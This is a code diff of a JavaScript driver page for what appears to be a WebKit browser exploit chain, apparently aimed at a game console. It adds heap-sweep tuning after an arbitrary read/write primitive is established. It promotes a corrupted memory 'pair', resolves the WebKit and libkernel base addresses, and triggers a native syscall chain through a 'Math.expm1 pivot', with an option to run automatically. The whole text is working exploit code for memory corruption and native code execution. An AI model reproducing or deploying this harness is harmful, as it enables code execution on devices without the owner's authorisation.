@@ -4,7 +4,14 @@ import { installWindowP, pairStatus } from "./mem.js";
 import { groomBootLine, wireGroomBar } from "./groom_presets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250827d";
+const BUILD_ID = "rw-20250827e";
+/** promote real pair after primitive — frees ~96MB 12M carrier (chain_poops ?pair=1) */
+const PROMOTE_PAIR = params.get("promote") !== "0";
+const SWEEP_CYCLES = params.has("sweep")
+    ? parseInt(params.get("sweep"), 10) : (PROMOTE_PAIR ? 3 : 0);
+const SWEEP_MB = params.has("sweepmb") ? parseInt(params.get("sweepmb"), 10) : 2;
+const SWEEP_MS = params.has("sweepms") ? parseInt(params.get("sweepms"), 10) : 80;
+const AUTO_NATIVE = params.get("native") === "1";
 /** Skip heavy pointer map on Start unless ?rwproof=1 (saves memory for native call) */
 const SKIP_RW_PROOF = params.get("rwproof") !== "1";
 const HW_GADGETS_1352 = {
@@ -248,6 +255,31 @@ function resolveWebkitBase(off, nativeFn) {
     return null;
 }
 
+async function sweepAfterPromote() {
+    if (!PROMOTE_PAIR || !pairStatus.promoted || SWEEP_CYCLES <= 0) {
+        mark("SWEEP-SKIP", "promoted=" + pairStatus.promoted
+            + " cycles=" + SWEEP_CYCLES);
+        return;
+    }
+    mark("SWEEP", "cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB
+        + " floor_ms=" + SWEEP_MS);
+    state("sweeping carrier debris…", "warn");
+    const t0 = Date.now();
+    let worst = 0;
+    for (let i = 0; i < SWEEP_CYCLES; i++) {
+        const c0 = Date.now();
+        let junk = [];
+        for (let k = 0; k < SWEEP_MB; k++)
+            junk.push(new ArrayBuffer(0x100000));
+        junk.length = 0;
+        junk = null;
+        await new Promise(r => setTimeout(r, SWEEP_MS));
+        const dt = Date.now() - c0;
+        if (dt > worst) worst = dt;
+    }
+    mark("SWEEP-DONE", "worst_ms=" + worst + " total_ms=" + (Date.now() - t0));
+}
+
 async function freeAfterPrimitive() {
     retained.length = 0;
     if (lines.length > 4) {
@@ -272,14 +304,21 @@ async function freeAfterPrimitive() {
 async function freeBeforeNative() {
     retained.length = 0;
     pointers.length = 0;
-    renderMap();
-    if (lines.length > 4) {
-        lines.splice(0, lines.length - 4);
-        if (outEl) outEl.textContent = lines.join("\n");
-    }
-    if (exploit && exploit.trimExploitDebris)
-        exploit.trimExploitDebris();
-    await new Promise(r => setTimeout(r, 200));
+    if (mapBody) mapBody.innerHTML = "<tr><td colspan=\"3\">(cleared for native)</td></tr>";
+    if (pickPtr) pickPtr.innerHTML = "<option value=\"\">pick known ptr…</option>";
+    if (hexEl) hexEl.textContent = "—";
+    lines.length = 0;
+    if (outEl) outEl.textContent = "";
+    try {
+        if (exploit && exploit.trimExploitDebris)
+            exploit.trimExploitDebris();
+        else {
+            const core = await import("./core.js");
+            if (core.trimExploitDebris) core.trimExploitDebris();
+        }
+    } catch (_) { }
+    exploit = null;
+    await new Promise(r => setTimeout(r, 400));
 }
 
 function seedNativeSession(p, off) {
@@ -292,46 +331,55 @@ function seedNativeSession(p, off) {
     return fn;
 }
 
+async function doNativeCall() {
+    const p = window.p;
+    if (!p) throw new Error("window.p missing");
+    await freeBeforeNative();
+    const off = loadEffectiveOff();
+    const nativeFn = captureNativeFnQuick(p, off);
+    const webkitBase = resolveWebkitBase(off, nativeFn);
+    if (!webkitBase) {
+        mark("NATIVE-FAIL", "no webkitBase — run index_cal Accept first");
+        state("need cal base", "bad");
+        return;
+    }
+    if (!pairStatus.promoted) {
+        mark("NATIVE-WARN", "pair not promoted — OOM likely (?promote=0)");
+    }
+    if (nativeChain) {
+        nativeChain.disarm();
+        nativeChain = null;
+    }
+    mark("NATIVE-TRY", "base=" + webkitBase + " build=" + BUILD_ID + " (trust, lite)");
+    const { initNativeCall } = await import("./native_call.js");
+    const chain = initNativeCall(p, off, {
+        webkitBase,
+        nativeFn,
+        log: mark,
+        trust: true,
+        noStubScan: true,
+        getpidOnly: true,
+    });
+    nativeChain = chain;
+    try {
+        sessionStorage.setItem("wk-libkernelBase", String(chain.libkernelBase));
+    } catch (_) { }
+    const pid = chain.sc(20).i32;
+    if (pid > 0) {
+        mark("NATIVE-OK", "getpid=" + pid);
+        state("native call OK pid=" + pid, "ok");
+    } else {
+        mark("NATIVE-FAIL", "getpid=" + pid);
+        state("getpid returned <=0", "bad");
+    }
+}
+
 async function runNativeCall() {
     if (busy || !ready || !window.p) return;
     busy = true;
     setUi();
-    const p = window.p;
     try {
-        await freeBeforeNative();
-        const off = loadEffectiveOff();
-        const nativeFn = captureNativeFnQuick(p, off);
-        const webkitBase = resolveWebkitBase(off, nativeFn);
-        if (!webkitBase) {
-            mark("NATIVE-FAIL", "no webkitBase — run index_cal Accept first");
-            state("need cal base", "bad");
-            return;
-        }
-        if (nativeChain) {
-            nativeChain.disarm();
-            nativeChain = null;
-        }
-        mark("NATIVE-TRY", "base=" + webkitBase + " build=" + BUILD_ID + " (trust, lite)");
-        const { initNativeCall } = await import("./native_call.js");
-        const chain = initNativeCall(p, off, {
-            webkitBase,
-            nativeFn,
-            log: mark,
-            trust: true,
-            noStubScan: true,
-        });
-        nativeChain = chain;
-        try {
-            sessionStorage.setItem("wk-libkernelBase", String(chain.libkernelBase));
-        } catch (_) { }
-        const pid = chain.sc(20).i32;
-        if (pid > 0) {
-            mark("NATIVE-OK", "getpid=" + pid);
-            state("native call OK pid=" + pid, "ok");
-        } else {
-            mark("NATIVE-FAIL", "getpid=" + pid);
-            state("getpid returned <=0", "bad");
-        }
+        await doNativeCall();
     } catch (err) {
         if (nativeChain) {
             try { nativeChain.disarm(); } catch (_) { }
@@ -485,14 +533,22 @@ async function runStart() {
             throw err;
         }
 
-        installP(carrier, { promote: params.get("promote") === "1" });
+        installP(carrier, {
+            promote: PROMOTE_PAIR,
+            onEvent: (t, d) => {
+                if (/PAIR|TRIM|RELEASE|SWEEP|FAIL|ERROR/i.test(t))
+                    mark(t, d || "");
+            },
+        });
         const p = window.p;
         if (!p) throw new Error("window.p missing");
 
         mark("PRIMITIVE-OK", "arb rw live");
-        mark("PAIR-STATUS", "state=" + pairStatus.state);
+        mark("PAIR-STATUS", "state=" + pairStatus.state
+            + " promoted=" + pairStatus.promoted);
 
         await freeAfterPrimitive();
+        await sweepAfterPromote();
 
         const off = loadEffectiveOff();
         if (SKIP_RW_PROOF) {
@@ -500,6 +556,17 @@ async function runStart() {
             mark("START-LITE", "rw proof skipped (add ?rwproof=1 for full map)");
             ready = true;
             state("primitive OK — tap Native call", "ok");
+            if (AUTO_NATIVE) {
+                try { await doNativeCall(); }
+                catch (err) {
+                    if (nativeChain) {
+                        try { nativeChain.disarm(); } catch (_) { }
+                        nativeChain = null;
+                    }
+                    mark("NATIVE-FAIL", err.message || String(err));
+                    state("native call failed", "bad");
+                }
+            }
         } else {
             const ok = await runRwProof(p, off);
             ready = true;
@@ -586,7 +653,7 @@ function init() {
     }
 
     mark("BOOT", "build=" + BUILD_ID + " — native call via Math.expm1 pivot");
-    mark("BOOT", "index_rw.html — same groom bar as cal (384 drain default)");
+    mark("BOOT", "index_rw.html — promote=" + PROMOTE_PAIR + " (frees 12M carrier)");
     mark("BOOT", groomBootLine(params));
     mark("BOOT", "one establishPrimitive run — internal auto-retry until win");
     window.addEventListener("beforeunload", function () {
